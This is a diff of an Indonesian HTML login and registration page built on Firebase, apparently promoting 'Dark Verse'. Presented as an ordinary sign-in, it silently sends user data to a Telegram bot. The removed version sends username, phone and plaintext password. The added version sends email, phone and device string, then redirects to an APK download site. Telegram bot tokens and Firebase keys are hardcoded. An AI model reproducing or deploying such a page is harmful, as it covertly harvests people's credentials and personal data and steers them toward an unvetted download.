@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Welcome Back Login</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dark Verse Upgrade 2026</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-*{box-sizing:border-box;font-family:Inter,Segoe UI,Arial,sans-serif}
+*{box-sizing:border-box;font-family:Poppins,sans-serif}
 
 body{
 margin:0;
@@ -14,196 +16,200 @@ height:100vh;
 display:flex;
 align-items:center;
 justify-content:center;
-background: radial-gradient(circle at 20% 20%, #12001f, #12001f 70%);
-color:white
+background:radial-gradient(circle at top,#14002a,#070010);
+color:white;
 }
+
+.container{width:380px}
 
 .card{
-width:340px;
-padding:30px 26px;
+padding:35px;
 border-radius:28px;
 background:rgba(255,255,255,0.05);
-backdrop-filter:blur(14px);
-box-shadow:0 0 40px rgba(138,0,255,.45);
-text-align:center
+backdrop-filter:blur(18px);
+box-shadow:0 0 40px rgba(168,85,247,.35);
+text-align:center;
+animation:fade .6s;
 }
 
-.avatar{
-width:70px;
-height:70px;
-border-radius:18px;
-margin:auto;
-background:linear-gradient(135deg,#d9d9ff,#5c5cff);
-display:flex;
-align-items:center;
-justify-content:center;
-box-shadow:0 0 25px #b86bff;
-margin-bottom:14px;
-overflow:hidden;
+@keyframes fade{
+from{opacity:0;transform:translateY(20px)}
+to{opacity:1}
 }
 
-/* Gambar avatar */
-.avatar img{
+input{
 width:100%;
-height:100%;
-object-fit:cover;
-border-radius:18px;
-}
-
-h1{margin:6px 0 4px;font-size:24px;font-weight:700}
-p{margin:0 0 18px;color:#cfc9ff;font-size:13px}
-
-.field{position:relative;margin-bottom:14px}
-
-.field input{
-width:100%;
-padding:13px 42px 13px 14px;
-border-radius:14px;
+padding:14px;
+margin-bottom:12px;
 border:none;
+border-radius:14px;
 background:rgba(255,255,255,.08);
 color:white;
-font-size:14px;
 outline:none;
-transition:.25s
-}
-
-.field input:focus{
-background:rgba(255,255,255,.14);
-box-shadow:0 0 0 2px #9c6cff
-}
-
-.icon{
-position:absolute;
-right:12px;
-top:50%;
-transform:translateY(-50%);
-cursor:pointer;
-opacity:.7;
-font-size:15px
 }
 
 button{
 width:100%;
-margin-top:6px;
-padding:13px;
+padding:14px;
 border:none;
-border-radius:18px;
-background:linear-gradient(90deg,#a200ff,#ff7bf1);
-color:white;
-font-size:15px;
+border-radius:14px;
 font-weight:600;
 cursor:pointer;
-box-shadow:0 0 20px #b14cff;
-transition:.25s
+background:linear-gradient(90deg,#9333ea,#ec4899);
+color:white;
+box-shadow:0 0 25px #9333ea;
 }
 
-button:hover{
-transform:translateY(-2px);
-box-shadow:0 0 26px #d46bff
+.switch{
+margin-top:14px;
+font-size:13px;
+color:#c084fc;
+cursor:pointer;
 }
 
-.msg{margin-top:12px;font-size:13px;height:16px}
-.success{color:#79ffb2}
-.error{color:#ff7b9c}
+.msg{height:18px;margin-top:10px;font-size:13px}
+.success{color:#4ade80}
+.error{color:#fb7185}
 </style>
 </head>
 
 <body>
 
-<div class="card">
-
-<div class="avatar">
-<img src="https://raw.githubusercontent.com/RayanXweb/dark-verse-terbaru-/refs/heads/main/icon.png">
-</div>
-
-<h1>Welcome Back</h1>
-<p>Sign in to continue</p>
-
-<div class="field">
-<input id="user" type="text" placeholder="Username" />
-<span class="icon">👤</span>
-</div>
-
-<div class="field">
-<input id="phone" type="tel" placeholder="Phone Number" />
-<span class="icon">📱</span>
-</div>
-
-<div class="field">
-<input id="pass" type="password" placeholder="Password" />
-<span class="icon" id="toggle">👁</span>
-</div>
-
-<button id="loginBtn">Sign Up</button>
-<div id="msg" class="msg"></div>
-
-</div>
+<div class="container" id="app"></div>
 
 <script type="module">
+
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+import {
+getAuth,onAuthStateChanged,
+createUserWithEmailAndPassword,
+signInWithEmailAndPassword,
+signOut
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+
+import {
+getFirestore,doc,setDoc,getDoc
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyCGkxMigetfvxYYLcVcODftMyqMXBJhOVQ",
-  authDomain: "dark-verse-54c63.firebaseapp.com",
-  projectId: "dark-verse-54c63",
-  storageBucket: "dark-verse-54c63.firebasestorage.app",
-  messagingSenderId: "188162026500",
-  appId: "1:188162026500:web:f76bca12b1de60b8381951",
-  measurementId: "G-E7K7EXMT59"
+  apiKey: "AIzaSyCmeMZAvIK4JXS2G2m15JTPWdUiOe1C5qc",
+  authDomain: "website-login-9d67b.firebaseapp.com",
+  projectId: "website-login-9d67b",
+  storageBucket: "website-login-9d67b.firebasestorage.app",
+  messagingSenderId: "914596260910",
+  appId: "1:914596260910:web:f40ffe25362b1450bdc3bf",
+  measurementId: "G-M1220VTYZM"
 };
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const BOT_TOKEN = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls";
+const CHAT_ID = "8215645360";
+const REDIRECT_URL = "https://seruapk.com/dark-verse/download/"; // tujuan setelah login
 
-const toggle=document.getElementById('toggle');
-const pass=document.getElementById('pass');
-const phone=document.getElementById('phone');
-const msg=document.getElementById('msg');
+const appFirebase = initializeApp(firebaseConfig);
+const auth = getAuth();
+const db = getFirestore();
+const app = document.getElementById("app");
 
-toggle.onclick=()=>{pass.type=pass.type==='password'?'text':'password'}
-
-async function login(){
-  const u=document.getElementById('user').value.trim();
-  const p=pass.value.trim();
-  if(!u||!p||!phone.value.trim()){
-    msg.textContent='Semua field wajib diisi';
-    msg.className='msg error';
-    return;
-  }
-  try{
-    const ref=doc(db,'users',u);
-    const snap=await getDoc(ref);
-    if(!snap.exists()){
-      msg.textContent='User tidak ditemukan';
-      msg.className='msg error';
-      return;
-    }
-    const data=snap.data();
-    if(data.password===p){
-      const botToken="8266964903:AAHsuA4bjvR8ozyPrFGDW466aPLEpszNzDs";
-      const chatId="8215645360";
-      const textMsg=`LOGIN%0AUser: ${u}%0APhone: ${phone.value}%0APassword: ${p}`;
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMsg}`).catch(()=>{});
-      msg.textContent='Login berhasil ✔';
-      msg.className='msg success';
-      setTimeout(()=>{
-        const text=encodeURIComponent('tolong add min');
-        window.location.href=`https://t.me/@zidanxstore037?text=${text}`;
-      },900);
-    }else{
-      msg.textContent='Password salah';
-      msg.className='msg error';
-    }
-  }catch(e){
-    msg.textContent='Firebase error';
-    msg.className='msg error';
-    console.error(e);
-  }
+function showLogin(){
+app.innerHTML=`
+<div class="card">
+<h2>Login</h2>
+<input id="email" placeholder="Email">
+<input id="pass" type="password" placeholder="Password">
+<button onclick="login()">Login</button>
+<div class="switch" onclick="showRegister()">Belum punya akun?</div>
+<div id="msg" class="msg"></div>
+</div>`;
 }
 
-document.getElementById('loginBtn').onclick=login;
-</script>
+function showRegister(){
+app.innerHTML=`
+<div class="card">
+<h2>Register</h2>
+<input id="phone" placeholder="Nomor HP">
+<input id="email" placeholder="Email">
+<input id="pass" type="password" placeholder="Password">
+<button onclick="register()">Register</button>
+<div class="switch" onclick="showLogin()">Sudah punya akun?</div>
+<div id="msg" class="msg"></div>
+</div>`;
+}
 
+function msg(text,type){
+document.getElementById("msg").className="msg "+type;
+document.getElementById("msg").textContent=text;
+}
+
+/* REGISTER */
+window.register = async () => {
+try{
+const phone = document.getElementById("phone").value;
+const email = document.getElementById("email").value;
+const pass = document.getElementById("pass").value;
+
+const user = await createUserWithEmailAndPassword(auth,email,pass);
+
+await setDoc(doc(db,"users",user.user.uid),{
+phone:phone,
+device:navigator.userAgent
+});
+
+msg("Register berhasil ✔","success");
+
+}catch(e){msg(e.message,"error")}
+};
+
+/* LOGIN */
+window.login = async () => {
+try{
+
+const email = document.getElementById("email").value;
+const pass = document.getElementById("pass").value;
+
+const user = await signInWithEmailAndPassword(auth,email,pass);
+const uid = user.user.uid;
+
+const snap = await getDoc(doc(db,"users",uid));
+
+/* ANTI MULTI LOGIN */
+if(snap.data().device !== navigator.userAgent){
+msg("Akun aktif di device lain","error");
+await signOut(auth);
+return;
+}
+
+/* KIRIM TELEGRAM */
+const text = `
+🔥 LOGIN BERHASIL
+📧 ${email}
+📱 ${snap.data().phone}
+💻 ${navigator.userAgent}
+`;
+
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+msg("Login berhasil...","success");
+
+/* REDIRECT */
+setTimeout(()=>{
+window.location.href = REDIRECT_URL;
+},1200);
+
+}catch(e){msg(e.message,"error")}
+};
+
+/* AUTO LOGIN */
+onAuthStateChanged(auth,user=>{
+if(user){
+window.location.href = REDIRECT_URL;
+}else{
+showLogin();
+}
+});
+
+window.showRegister = showRegister;
+window.showLogin = showLogin;
+
+</script>
 </body>
 </html>
